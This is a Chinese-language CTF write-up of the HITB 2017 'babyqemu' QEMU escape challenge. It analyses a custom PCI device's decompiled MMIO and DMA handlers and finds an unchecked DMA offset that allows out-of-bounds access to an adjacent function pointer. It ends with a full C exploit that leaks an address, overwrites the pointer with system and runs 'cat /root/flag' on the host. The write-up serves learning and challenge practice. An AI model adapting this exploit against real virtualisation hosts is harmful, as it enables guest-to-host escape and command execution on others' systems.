启动命令是

```shell
#!/bin/sh
./qemu-system-x86_64 \
-initrd ./rootfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-enable-kvm \
-monitor /dev/null \
-m 64M --nographic  -L ./dependency/usr/local/share/qemu \
-L pc-bios \
-device hitb,id=vda
```

可以看到device是hitb，那么我们将qemu-system-x86_64文件拖入ida中进行分析，搜寻hitb函数

![image-20201011134832300](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201011134832300.png)

可以观察到此题是利用mmio来读写设备寄存器。再来观察hitb设备的结构体，其中还包含了dma_state结构体

```
00000000 HitbState       struc ; (sizeof=0x1BD0, align=0x10, copyof_1493)
00000000 pdev            PCIDevice_0 ?
000009F0 mmio            MemoryRegion_0 ?
00000AF0 thread          QemuThread_0 ?
00000AF8 thr_mutex       QemuMutex_0 ?
00000B20 thr_cond        QemuCond_0 ?
00000B50 stopping        db ?
00000B51                 db ? ; undefined
00000B52                 db ? ; undefined
00000B53                 db ? ; undefined
00000B54 addr4           dd ?
00000B58 fact            dd ?
00000B5C status          dd ?
00000B60 irq_status      dd ?
00000B64                 db ? ; undefined
00000B65                 db ? ; undefined
00000B66                 db ? ; undefined
00000B67                 db ? ; undefined
00000B68 dma             dma_state ?
00000B88 dma_timer       QEMUTimer_0 ?
00000BB8 dma_buf         db 4096 dup(?)
00001BB8 enc             dq ?                    ; offset
00001BC0 dma_mask        dq ?
00001BC8                 db ? ; undefined
00001BC9                 db ? ; undefined
00001BCA                 db ? ; undefined
00001BCB                 db ? ; undefined
00001BCC                 db ? ; undefined
00001BCD                 db ? ; undefined
00001BCE                 db ? ; undefined
00001BCF                 db ? ; undefined
00001BD0 HitbState       ends
00001BD0
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_1491)
00000000                                         ; XREF: HitbState/r
00000000 src             dq ?
00000008 dst             dq ?
00000010 cnt             dq ?
00000018 cmd             dq ?
00000020 dma_state       ends
```

查看`hitb_class_init`函数

```c
void __fastcall hitb_class_init(ObjectClass_0 *a1, void *data)
{
  PCIDeviceClass *v2; // rax

  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(
                           a1,
                           "pci-device",
                           "/mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c",
                           469,
                           "hitb_class_init");
  v2->revision = 0x10;
  v2->class_id = 0xFF;
  v2->realize = (void (*)(PCIDevice_0 *, Error_0 **))pci_hitb_realize;
  v2->exit = (PCIUnregisterFunc *)pci_hitb_uninit;
  v2->vendor_id = 0x1234;
  v2->device_id = 0x2333;
}
```

获取到vendor_id和device_id信息，在虚拟机里进行查看，获取hitb设备的起始和结束地址

```shell
# lspci
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:03.0 Class 0200: 8086:100e
00:01.1 Class 0101: 8086:7010
00:02.0 Class 0300: 1234:1111
00:01.0 Class 0601: 8086:7000
00:04.0 Class 00ff: 1234:2333
# cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource
0x00000000fea00000 0x00000000feafffff 0x0000000000040200
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

接着是`pci_hitb_realize`函数

```c
void __fastcall pci_hitb_realize(PCIDevice_0 *pdev, Error_0 **errp)
{
  pdev->config[61] = 1;
  if ( !msi_init(pdev, 0, 1u, 1, 0, errp) )
  {
    timer_init_tl(&pdev[1].io_regions[4], main_loop_tlg.tl[1], 1000000, hitb_dma_timer, pdev);
    qemu_mutex_init(&pdev[1].io_regions[0].type);
    qemu_cond_init(&pdev[1].io_regions[1].type);
    qemu_thread_create(&pdev[1].io_regions[0].size, "hitb", hitb_fact_thread, pdev, 0);
    memory_region_init_io(&pdev[1], &pdev->qdev.parent_obj, &hitb_mmio_ops, pdev, "hitb-mmio", 0x100000uLL);
    pci_register_bar(pdev, 0, 0, &pdev[1]);
  }
}
```

可以看到的是注册了一个hitb_mmio_ops内存操作的结构体，该结构体里包含了`hitb_mmio_read`以及`hitb_mmio_write`，size为0x100000

`hitb_mmio_write`函数

```c
void __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t v4; // er13
  int v5; // edx
  bool v6; // zf
  int64_t v7; // rax

  if ( (addr > 0x7F || size == 4) && (!((size - 4) & 0xFFFFFFFB) || addr <= 0x7F) )// 分为三种情况
                                                // size == 4，addr <= 0x7F
                                                // size == 4，addr > 0x7F
                                                // size == 8，addr > 0x7F
                                                // 
  {
    if ( addr == 0x80 )
    {
      if ( !(opaque->dma.cmd & 1) )             // addr == 0x80,dma.cmd = 0
        opaque->dma.src = val;
    }
    else
    {
      v4 = val;
      if ( addr > 0x80 )
      {
        if ( addr == 0x8C )
        {                                       // addr == 0x8c，dma.cmd = 0
          if ( !(opaque->dma.cmd & 1) )
            *(dma_addr_t *)((char *)&opaque->dma.dst + 4) = val;
        }
        else if ( addr > 0x8C )
        {
          if ( addr == 0x90 )
          {
            if ( !(opaque->dma.cmd & 1) )       // addr == 0x90，dma.cmd == 0
              opaque->dma.cnt = val;
          }
          else if ( addr == 0x98 && val & 1 && !(opaque->dma.cmd & 1) )// addr == 0x98，dma.cmd == 0
          {
            opaque->dma.cmd = val;
            v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);
            timer_mod(
              &opaque->dma_timer,
              ((signed __int64)((unsigned __int128)(0x431BDE82D7B634DBLL * (signed __int128)v7) >> 64) >> 18)
            - (v7 >> 63)
            + 100);
          }
        }
        else if ( addr == 0x84 )
        {
          if ( !(opaque->dma.cmd & 1) )         // addr == 0x84，dma.cmd == 0
            *(dma_addr_t *)((char *)&opaque->dma.src + 4) = val;
        }
        else if ( addr == 0x88 && !(opaque->dma.cmd & 1) )// addr == 0x88，dma.cmd == 0
        {
          opaque->dma.dst = val;
        }
      }
      else if ( addr == 0x20 )
      {
        if ( val & 0x80 )
          _InterlockedOr((volatile signed __int32 *)&opaque->status, 0x80u);
        else
          _InterlockedAnd((volatile signed __int32 *)&opaque->status, 0xFFFFFF7F);
      }
      else if ( addr > 0x20 )
      {
        if ( addr == 96 )
        {
          v6 = ((unsigned int)val | opaque->irq_status) == 0;
          opaque->irq_status |= val;
          if ( !v6 )
            hitb_raise_irq(opaque, 0x60u);
        }
        else if ( addr == 100 )
        {
          v5 = ~(_DWORD)val;
          v6 = (v5 & opaque->irq_status) == 0;
          opaque->irq_status &= v5;
          if ( v6 && !msi_enabled(&opaque->pdev) )
            pci_set_irq(&opaque->pdev, 0);
        }
      }
      else if ( addr == 4 )
      {
        opaque->addr4 = ~(_DWORD)val;
      }
      else if ( addr == 8 && !(opaque->status & 1) )
      {
        qemu_mutex_lock(&opaque->thr_mutex);
        opaque->fact = v4;
        _InterlockedOr((volatile signed __int32 *)&opaque->status, 1u);
        qemu_cond_signal(&opaque->thr_cond);
        qemu_mutex_unlock(&opaque->thr_mutex);
      }
    }
  }
}
```

可以获取到的信息是：

1. addr = 0x80 && dma.cmd = 0 -----> dma.src = val
2. addr = 0x84 && dma.cmd = 0 -----> *(dma.src + 4) = val
3. addr = 0x88 && dma.cmd = 0 -----> dma.dst = vla
4. addr = 0x8c && dma.cmd = 0 -----> *(dma.dst + 4) = val
5. addr = 0x90 && dma.cmd = 0 -----> dma.cnt = val
6. addr = 0x98 && dma.cmd = 0 -----> dma.cmd = 1|3|5|7|11 ...... (奇数即可)

`hitb_mmio_read`函数

```c
uint64_t __fastcall hitb_mmio_read(HitbState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint64_t val; // ST08_8

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr == 0x80 )
      return opaque->dma.src;
    if ( addr > 0x80 )
    {
      if ( addr == 0x8C )
        return *(dma_addr_t *)((char *)&opaque->dma.dst + 4);
      if ( addr <= 0x8C )
      {
        if ( addr == 0x84 )
          return *(dma_addr_t *)((char *)&opaque->dma.src + 4);
        if ( addr == 0x88 )
          return opaque->dma.dst;
      }
      else
      {
        if ( addr == 0x90 )
          return opaque->dma.cnt;
        if ( addr == 0x98 )
          return opaque->dma.cmd;
      }
    }
    else
    {
      if ( addr == 8 )
      {
        qemu_mutex_lock(&opaque->thr_mutex);
        val = opaque->fact;
        qemu_mutex_unlock(&opaque->thr_mutex);
        return val;
      }
      if ( addr <= 8 )
      {
        result = 0x10000EDLL;
        if ( !addr )
          return result;
        if ( addr == 4 )
          return opaque->addr4;
      }
      else
      {
        if ( addr == 32 )
          return opaque->status;
        if ( addr == 36 )
          return opaque->irq_status;
      }
    }
    result = -1LL;
  }
  return result;
}
```

可以获取到的信息是：

1. addr = 0x80 ------> 读取dma.src
2. addr = 0x84 ------> 读取*(dma.src + 4)
3. addr = 0x88 ------> 读取dma.dst
4. addr = 0x8c ------> 读取*(dma.dst + 4)
5. addr = 0x90 ------> 读取dma.cnt
6. addr = 0x98 ------> 读取dma.cmd

`hitb_dma_timer`函数

```c
void __fastcall hitb_dma_timer(HitbState *opaque)
{
  dma_addr_t v1; // rax
  __int64 v2; // rdx
  uint8_t *v3; // rsi
  dma_addr_t v4; // rax
  dma_addr_t v5; // rdx
  uint8_t *v6; // rbp
  uint8_t *v7; // rbp

  v1 = opaque->dma.cmd;
  if ( v1 & 1 )                                 // dma.cmd为奇数
  {
    if ( v1 & 2 )                               // 二进制的最后两位都为1的数，3|7|15 ......
    {
      v2 = (unsigned int)(LODWORD(opaque->dma.src) - 0x40000);
      if ( v1 & 4 )                             // 二进制的最后三位都为1的数，7|15 ......
      {
        v7 = (uint8_t *)&opaque->dma_buf[v2];
        ((void (__fastcall *)(uint8_t *, _QWORD))opaque->enc)(v7, LODWORD(opaque->dma.cnt));
        v3 = v7;
      }
      else                                      // 二进制的最后两位都为1且倒数第三位为0，3|11 ......
      {
        v3 = (uint8_t *)&opaque->dma_buf[v2];
      }
      cpu_physical_memory_rw(opaque->dma.dst, v3, opaque->dma.cnt, 1);// 1为read
      v4 = opaque->dma.cmd;
      v5 = opaque->dma.cmd & 4;
    }
    else                                        // 二进制的最后一位为1且倒数第二位为0，1|5|9|13 ......
    {
      v6 = (uint8_t *)&opaque[4294967260] + (unsigned int)opaque->dma.dst - 2824;
      LODWORD(v3) = (_DWORD)opaque + opaque->dma.dst - 262144 + 3000;
      cpu_physical_memory_rw(opaque->dma.src, v6, opaque->dma.cnt, 0);// 0为write
      v4 = opaque->dma.cmd;
      v5 = opaque->dma.cmd & 4;
      if ( opaque->dma.cmd & 4 )                // 二进制的最后一位为1，倒数第二位为0，倒数第三位为1，5|13 ......
      {
        v3 = (uint8_t *)LODWORD(opaque->dma.cnt);
        ((void (__fastcall *)(uint8_t *, uint8_t *, dma_addr_t))opaque->enc)(v6, v3, v5);
        v4 = opaque->dma.cmd;
        v5 = opaque->dma.cmd & 4;
      }
    }
    opaque->dma.cmd = v4 & 0xFFFFFFFFFFFFFFFELL;
    if ( v5 )                                   // 二进制的最后一位为1，倒数第二位为0 or 1，倒数第三位为1
                                                // 5|7|13|15 ......
    {
      opaque->irq_status |= 0x100u;
      hitb_raise_irq(opaque, (uint32_t)v3);
    }
  }
}
```

可以获取到的信息是：

1. 当二进制的最后两位都为1且倒数第三位为0时，即`dma.cmd` = 3|11 ...... ，将dma_buf[src-0x40000]中长度为cnt的内容存储到dst指向的内存中
2. 二进制的最后三位都为1的数，即`dma.cmd` = 7|15 ...... ，将dma_buf[src-0x40000]中长度为cnt的内容经过enc加密后存储到dst指向的内存中
3. 二进制的最后一位为1且倒数第二位为0，即`dma.cmd` = 1|5|9|13 ...... ，将src中长度为cnt的内容存储到dma_buf[dst - 0x40000]中

到这里基本上可以看出这个设备的功能，主要是实现了一个`dma`机制。DMA(Direct Memory Access，直接内存存取) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。DMA 传输将数据从一个地址空间复制到另外一个地址空间。当CPU 初始化这个传输动作，传输动作本身是由 DMA 控制器来实行和完成。

即首先通过访问mmio地址与值（`addr`与`value`），在`hitb_mmio_write`函数中设置好`dma`中的相关值（`src`、`dst`以及`cmd`)。当需要`dma`传输数据时，设置`addr`为152，就会触发时钟中断，由另一个线程去处理时钟中断。

时钟中断调用`hitb_dma_timer`，该函数根据`dma.cmd`的不同调用`cpu_physical_memory_rw`函数将数据从物理地址拷贝到`dma_buf`中或从`dma_buf`拷贝到物理地址中。

**漏洞点**：

我们可以发现，在timer中，我们写入的地址为`opaque->dma.src`，那么这个src又是在哪里设置的呢，经过观察可得，在write函数中，addr = 0x80 && dma.cmd = 0 -----> dma.src = val，其并没有对val进行任何的检测，这就导致了我们可以对数组越界读写。我们再来康康这个数组

```
00000BB8 dma_buf         db 4096 dup(?)
00001BB8 enc             dq ?                    ; offset
```

4096个字节大小，也就是0x1000，后面直接跟着一个enc指针。

**利用**：

1. 利用数组越界进行越界读取enc指针，泄露其值。然后根据偏移得到程序基址，再计算system_plt的地址

   具体来说就是让dst指向dma_buf（此处就是你自己设置的userbuf_pa），然后调用timer中的第一种情况，将enc指针信息写入dma_buf

2. 将参数cat /root/flag写入到dma_buf中

   把"cat /root/flag"放入userbuf，然后让dma.src指向这个地址，调用timer中的第三种情况，将这个参数传到dma_buf + 0x100的位置

3. 进行越界写，将system_plt的地址写入enc指针，使得触发enc函数时调用system_plt，实现system("cat /root/flag")

   和上面类似，先把enc指针改写成system，然后dma.cnt赋值为0，dma.cmd赋值为7，就调用第二种情况进行加密。

需要指出的一点是`cpu_physical_memory_rw`是使用的物理地址（此处的物理地址其实指的是qemu进程分配出来的相应偏移）作为源地址或目标地址，因此我们需要先申请一段内存空间，并将其转换至其物理地址。

根据内核文档可知，每个虚拟页在 /proc/pid/pagemap 中对应一项长度为 64 bits 的数据，其中 Bit 63 为 page present，表示物理内存页是否已存在；若物理页已存在，则 Bits 0-54 表示物理页号。此外，需要 root 权限的进程才能读取 /proc/pid/pagemap 中的内容。

```
pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow
userspace programs to examine the page tables and related information by
reading files in /proc.

There are four components to pagemap:

*/proc/pid/pagemap. This file lets a userspace process find out which
physical frame each virtual page is mapped to. It contains one 64-bit
value for each virtual page, containing the following data (from
fs/proc/task_mmu.c, above pagemap_read):

* Bits 0-54 page frame number (PFN) if present
* Bits 0-4 swap type if swapped
* Bits 5-54 swap offset if swapped
* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
* Bit 56 page exclusively mapped (since 4.2)
* Bits 57-60 zero
* Bit 61 page is file-page or shared-anon (since 3.5)
* Bit 62 page swapped
* Bit 63 page present

Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.
In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from
4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.
Reason: information about PFNs helps in exploiting Rowhammer vulnerability.
```

根据以上信息，利用 /proc/pid/pagemap 可将虚拟地址转换为物理地址，具体步骤如下：

1. 计算虚拟地址所在虚拟页对应的数据项在 /proc/pid/pagmap 中的偏移，offset = (viraddr / pagesize) * sizeof(uint64_t)
2. 读取长度为 64 bits 的数据项；
3. 根据 Bit 63 判断物理内存页是否存在；
4. 若物理内存页已存在，则取 bits 0 - 54 作为物理页号（pageframenum）；
5. 计算出物理页起始地址加上页内偏移即得到物理地址，phyaddr = pageframenum * pagesize + viraddr % pagesize;

exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>   
#include <stdint.h>

#define DMABASE 0x40000
char *userbuf;
uint64_t userbuf_pa;
unsigned char* mmio_mem;

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}

size_t va2pa(void *addr){
	uint64_t data;

	int fd = open("/proc/self/pagemap",O_RDONLY);
	if(!fd){
		perror("open pagemap");
        return 0;
	}

	size_t pagesize = getpagesize();
	size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

	if(lseek(fd,offset,SEEK_SET) < 0){
		puts("lseek");
		close(fd);
		return 0;
	}

	if(read(fd,&data,8) != 8){
		puts("read");
		close(fd);
		return 0;
	}

	if(!(data & (((uint64_t)1 << 63)))){
		puts("page");
		close(fd);
		return 0;
	}

	size_t pageframenum = data & ((1ull << 55) - 1);
	size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

	close(fd);

	return phyaddr;
}

void write_src(uint32_t src){
	mmio_write(0x80,src);
}

void write_dst(uint32_t dst){
	mmio_write(0x88,dst);
}

void write_cnt(uint32_t cnt){
	mmio_write(0x90,cnt);
}

void write_cmd(uint32_t cmd){
	mmio_write(0x98,cmd);
}

void read_enc_addr(){
	write_dst(userbuf_pa);
	write_src(0x41000);
	write_cnt(8);
	write_cmd(3);
	sleep(1);
}

void write_system_addr(void *buf, size_t len){
    assert(len<0x1000);

    memcpy(userbuf,buf,len);

    write_dst(0x41000);
	write_src(userbuf_pa);
    write_cnt(len);
    write_cmd(1);

    sleep(1);
}

void write_cat_addr(void *buf,size_t len){
	assert(len<0x1000);

    memcpy(userbuf,buf,len);

    write_dst(0x40100);
	write_src(userbuf_pa);
    write_cnt(len);
    write_cmd(1);

    sleep(1);
}

void enc(){
	write_src(0x40100);
	write_cnt(0);
	write_cmd(7);
}

int main(){
	// O_RDWR 读、写打开,O_SYNC每次write都等到物理I/O完成
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR | O_SYNC);
    // open failed
    if (mmio_fd == -1){
        perror("open mmio"); // perror（）用来将上一个函数发生错误的原因输出到标准设备
        exit(-1);
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED){
    	perror("mmap mmio");
        exit(-1);
    }

    printf("mmio_mem:\t%p\n", mmio_mem);

    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED){
    	perror("mmap userbuf");
        exit(-1);
    }

    mlock(userbuf, 0x1000);
    userbuf_pa = va2pa(userbuf);

    printf("userbuf_va:\t%p\n",userbuf);
    printf("userbuf_pa:\t%p\n",(void *)userbuf_pa);

    read_enc_addr();

    uint64_t leak_enc=*(uint64_t*)userbuf;
    printf("enc_addr:\t%p\n",(void*)leak_enc);

    uint64_t libc_base = leak_enc - 0x283dd0;
    printf("libc_base:\t%p\n",(void*)libc_base);

    uint64_t system_addr = libc_base + 0x1FDB18;
    printf("system_addr:\t%p\n",(void*)system_addr);

    write_system_addr(&system_addr,8);

    char *cat_flag = "cat /root/flag\x00";
    write_cat_addr(cat_flag,strlen(cat_flag));
    enc();
}
```

